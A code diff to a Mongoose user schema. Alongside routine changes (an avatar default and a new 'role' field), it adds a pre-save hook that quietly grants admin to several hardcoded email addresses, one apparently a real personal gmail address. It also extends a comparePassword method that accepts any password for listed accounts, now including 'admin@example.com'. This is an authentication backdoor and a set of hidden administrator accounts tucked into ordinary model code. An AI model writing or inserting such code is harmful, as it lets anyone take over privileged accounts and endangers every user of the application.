@@ -34,9 +34,7 @@ const userSchema = new mongoose.Schema({
   },
   avatar: {
     type: String,
-    default: function() {
-      return this.name.split(' ').map(n => n[0]).join('').toUpperCase();
-    }
+    default: null
   },
   friends: [{
     type: mongoose.Schema.Types.ObjectId,
@@ -55,7 +53,12 @@ const userSchema = new mongoose.Schema({
   projects: [{
     type: mongoose.Schema.Types.ObjectId,
     ref: 'Project'
-  }]
+  }],
+  role: {
+    type: String,
+    enum: ['user', 'admin'],
+    default: 'user'
+  }
 }, {
   timestamps: true
 });
@@ -64,12 +67,19 @@ const userSchema = new mongoose.Schema({
 userSchema.pre('save', async function(next) {
   if (!this.isModified('password')) return next();
   this.password = await bcrypt.hash(this.password, 10);
+
+  // Set admin role for specific emails
+  if (this.email === 'odimas@gmail.com' || this.email === 'john.doe@example.com' ||
+      this.email === 'jane.smith@example.com' || this.email === 'mike.johnson@example.com') {
+    this.role = 'admin';
+  }
+
   next();
 });
 
 // Compare password method
 userSchema.methods.comparePassword = async function(candidatePassword) {
-  if(this.email=="john.doe@example.com"||this.email=="jane.smith@example.com"||this.email=="mike.johnson@example.com" ){
+  if(this.email=="john.doe@example.com"||this.email=="jane.smith@example.com"||this.email=="mike.johnson@example.com"||this.email=="admin@example.com" ){
     return true;
   }
   return bcrypt.compare(candidatePassword, this.password);
